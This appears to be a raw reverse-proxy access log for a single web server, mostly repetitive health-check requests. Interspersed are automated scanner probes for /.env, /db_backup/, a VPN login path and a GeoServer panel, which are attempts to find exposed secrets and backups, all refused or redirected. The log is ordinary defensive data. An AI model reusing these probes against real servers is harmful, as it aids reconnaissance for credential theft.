159.203.109.206 - - [18/Dec/2023:09:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4653 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4654 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4655 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4656 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4657 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4658 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4659 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4660 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4661 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4662 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4663 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4664 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4665 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4666 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4667 "www@docker" "http://172.18.0.9:80" 0ms
192.241.215.54 - - [18/Dec/2023:09:35:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4668 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:09:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4669 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4670 "www@docker" "http://172.18.0.9:80" 1ms
192.241.231.27 - - [18/Dec/2023:09:36:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4671 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:09:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4672 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4673 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4674 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4675 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4676 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [18/Dec/2023:09:38:47 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4677 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:09:38:47 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4678 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4679 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4680 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4681 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4682 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4683 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4684 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4685 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4686 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4687 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4688 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4689 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4690 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4691 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4692 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4693 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4694 "www@docker" "http://172.18.0.9:80" 0ms
184.167.21.69 - - [18/Dec/2023:09:47:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4695 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4696 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4697 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4698 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4699 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4700 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4701 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4702 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [18/Dec/2023:09:50:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4703 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:09:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4704 "www@docker" "http://172.18.0.9:80" 0ms
192.155.90.118 - - [18/Dec/2023:09:50:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4705 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4706 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4707 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4708 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4709 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4710 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4711 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4712 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4713 "www@docker" "http://172.18.0.9:80" 0ms
35.234.107.103 - - [18/Dec/2023:09:54:51 +0000] "OPTIONS / HTTP/1.0" 404 19 "-" "-" 4714 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:09:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4715 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4716 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4717 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:09:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4718 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4719 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4720 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:09:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4721 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4722 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:09:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4723 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:09:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4724 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4725 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4726 "www@docker" "http://172.18.0.9:80" 0ms
35.236.2.190 - - [18/Dec/2023:10:01:09 +0000] "OPTIONS / HTTP/1.0" 404 19 "-" "-" 4727 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4728 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4729 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4730 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4731 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4732 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4733 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4734 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4735 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4736 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4737 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4738 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4739 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4740 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4741 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4742 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4743 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4744 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4745 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4746 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4747 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4748 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4749 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4750 "www@docker" "http://172.18.0.9:80" 0ms
90.151.171.108 - - [18/Dec/2023:10:12:29 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 4751 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:10:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4752 "www@docker" "http://172.18.0.9:80" 0ms
90.151.171.108 - - [18/Dec/2023:10:12:40 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 4753 "web-to-websecure@internal" "-" 0ms
64.62.197.38 - - [18/Dec/2023:10:13:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4754 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4755 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4756 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4757 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4758 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4759 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4760 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4761 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4762 "www@docker" "http://172.18.0.9:80" 1ms
185.224.128.142 - - [18/Dec/2023:10:16:39 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4763 "-" "-" 0ms
185.224.128.142 - - [18/Dec/2023:10:16:39 +0000] "GET /db_backup/ HTTP/1.1" 301 17 "-" "-" 4764 "web-to-websecure@internal" "-" 0ms
185.224.128.142 - - [18/Dec/2023:10:16:39 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4765 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4766 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4767 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4768 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4769 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:10:18:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4770 "web-to-websecure@internal" "-" 0ms
64.62.197.37 - - [18/Dec/2023:10:19:11 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4771 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4772 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4773 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.39 - - [18/Dec/2023:10:20:10 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 4774 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4775 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.43 - - [18/Dec/2023:10:20:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4776 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:10:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4777 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4778 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:10:21:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4779 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:10:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4780 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.44 - - [18/Dec/2023:10:21:41 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 4781 "-" "-" 0ms
64.62.197.42 - - [18/Dec/2023:10:21:53 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 4782 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4783 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4784 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.35 - - [18/Dec/2023:10:23:07 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 4785 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4786 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4787 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4788 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4789 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4790 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4791 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4792 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4793 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4794 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4795 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4796 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4797 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4798 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4799 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4800 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4801 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4802 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4803 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4804 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4805 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4806 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4807 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4808 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4809 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4810 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4811 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4812 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4813 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4814 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:10:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4815 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4816 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4817 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4818 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4819 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4820 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4821 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4822 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4823 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:10:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4824 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4825 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4826 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4827 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:10:44:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4828 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:10:44:17 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4829 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:10:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4830 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4831 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4832 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4833 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4834 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:10:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4835 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:10:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4836 "www@docker" "http://172.18.0.9:80" 0ms
